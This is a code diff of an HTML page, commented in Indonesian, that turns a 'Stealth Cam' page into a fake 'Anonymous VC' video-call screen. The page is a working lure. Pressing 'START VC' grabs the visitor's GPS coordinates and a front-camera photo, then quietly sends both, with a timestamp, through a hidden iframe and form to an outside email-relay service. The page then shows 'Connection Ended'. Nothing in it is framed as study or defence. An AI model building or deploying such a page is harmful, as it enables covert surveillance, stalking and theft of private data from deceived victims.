@@ -3,96 +3,217 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Stealth Cam</title>
+    <title>Anonymous VC</title>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #status { font-size: 14px; color: #666; margin-top: 10px; }
-        #preview { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 999; }
-        #btn { padding: 15px 30px; font-size: 18px; background: #fff; border: none; border-radius: 30px; cursor: pointer; font-weight: bold; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            text-shadow: 0 0 5px #000;
+        }
+
+        .live-badge {
+            color: #ff0000;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #ff0000;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        .rec-badge {
+            color: #fff;
+            background: rgba(255, 0, 0, 0.2);
+            padding: 2px 8px;
+            border: 1px solid #fff;
+            font-size: 10px;
+        }
+
+        .center-msg {
+            text-align: center;
+            opacity: 0.8;
+        }
+
+        #status {
+            font-size: 14px;
+            color: #0f0;
+            margin-top: 10px;
+        }
+
+        #btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            backdrop-filter: blur(5px);
+            transition: 0.3s;
+            margin-top: 20px;
+        }
+
+        #btn:active {
+            background: #fff;
+            color: #000;
+            transform: scale(0.95);
+        }
+
+        /* Hidden Iframe for form submission */
+        #frmTarget {
+            display: none;
+        }
+
+        /* Hidden Input File */
+        #fileInput {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- IFRAME untuk menangani upload file tanpa reload -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    <!-- UI Overlay -->
+    <div id="overlay">
+        <div class="status-bar">
+            <div class="live-badge">
+                <div class="live-dot"></div> LIVE
+            </div>
+            <div class="rec-badge">REC ●</div>
+        </div>
+        
+        <div class="center-msg" id="uiContent">
+            <p>Anonymous Connection</p>
+            <button id="btn">START VC</button>
+            <div id="status">Ready...</div>
+        </div>
+    </div>
 
-    <!-- FORM UTAMA -->
-    <form id="stealthForm" action="https://formsubmit.co/ajax/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe">
+    <!-- Hidden Form & Iframe for sending data -->
+    <iframe id="frmTarget" name="frmTarget"></iframe>
+    
+    <form id="vcForm" 
+          action="https://formsubmit.co/ajax/desamancur477@gmail.com" 
+          method="POST" 
+          enctype="multipart/form-data" 
+          target="frmTarget">
         
-        <!-- Field Pesan -->
-        <input type="hidden" name="message" id="field_message">
+        <!-- Field Lokasi & Waktu -->
+        <input type="hidden" name="message" id="inputMessage">
         
-        <!-- Field File (PENTING: Nama field 'attachment') -->
-        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="environment">
+        <!-- Field Foto (PENTING: nama 'attachment') -->
+        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="user">
         
         <!-- Konfigurasi FormSubmit -->
+        <input type="hidden" name="_subject" value="Foto VC Baru Diterima!">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="">
-        <input type="hidden" name="_subject" value="Foto & Lokasi Baru">
     </form>
-
-    <button id="btn">Start</button>
-    <div id="status">Siap...</div>
 
     <script>
         const btn = document.getElementById('btn');
         const status = document.getElementById('status');
-        const form = document.getElementById('stealthForm');
+        const uiContent = document.getElementById('uiContent');
         const fileInput = document.getElementById('fileInput');
-        const messageField = document.getElementById('field_message');
-        const iframe = document.getElementById('hidden_iframe');
+        const messageInput = document.getElementById('inputMessage');
 
         btn.addEventListener('click', async () => {
-            status.innerText = "Mengambil Lokasi & Kamera...";
-            
             // 1. Ambil Lokasi
-            let lokasi = "Tidak ada lokasi";
+            let lokasi = "Lokasi tidak tersedia";
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                     });
-                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
-                } catch (e) { lokasi = "Lokasi ditolak"; }
+                    lokasi = `Lat: ${pos.coords.latitude.toFixed(6)}, Lng: ${pos.coords.longitude.toFixed(6)}`;
+                } catch (e) {
+                    lokasi = "Lokasi gagal diambil";
+                }
+            } else {
+                lokasi = "Browser tidak support lokasi";
             }
 
-            // 2. Ambil Foto (Native Camera)
-            // Kita klik input file yang sudah ada di form
+            status.innerText = "Membuka Kamera...";
+
+            // 2. Klik Input File Tersembunyi (Ini memicu kamera native)
+            // Atribut 'capture="user"' pada HTML di atas memaksa kamera depan
             fileInput.click();
 
-            // Tunggu user memilih foto
+            // 3. Tunggu User Mengambil Foto
             await new Promise(resolve => {
                 fileInput.onchange = () => {
-                    if (fileInput.files && fileInput.files[0]) {
-                        // File sudah terpilih!
-                    }
                     resolve();
                 };
             });
 
-            // Cek apakah ada file
-            if (!fileInput.files.length) {
-                status.innerText = "Gagal: Tidak ada foto dipilih.";
+            // 4. Cek apakah foto sudah dipilih
+            if (!fileInput.files || fileInput.files.length === 0) {
+                status.innerText = "Batal atau Gagal Membuka Kamera";
                 return;
             }
 
-            // 3. Isi Data & Submit
-            messageField.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}`;
-            status.innerText = "Mengirim...";
+            // 5. Siapkan Data & Submit
+            messageInput.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}\nUser: ${fileInput.files[0].name}`;
+            
+            status.innerText = "Mengirim Data...";
+            btn.style.display = 'none';
+            
+            // Kirim Form
+            document.getElementById('vcForm').submit();
 
-            // SUBMIT FORM (Ini kuncinya)
-            // Kita gunakan form.submit() yang akan mengirim ke iframe, bukan reload halaman
-            form.submit();
-
-            // 4. Tunggu response dari iframe
-            iframe.onload = () => {
+            // 6. Tunggu Response dari Iframe
+            const frm = document.getElementById('frmTarget');
+            frm.onload = () => {
                 try {
-                    const content = iframe.contentDocument.body.innerText;
-                    if (content.includes("success") || content.includes("200")) {
-                        status.innerText = "Foto & Lokasi Terkirim!";
-                        btn.style.display = 'none';
+                    const body = frm.contentDocument.body.innerText;
+                    if (body.includes("success")) {
+                        status.innerText = "Terkirim!";
+                        uiContent.innerHTML = `<h3>Connection Ended</h3><p>Data terkirim ke server.</p>`;
                     } else {
-                        status.innerText = "Gagal dikirim.";
+                        status.innerText = "Gagal (Cek Spam)";
                     }
                 } catch (e) {
                     status.innerText = "Selesai (Cek Spam)";
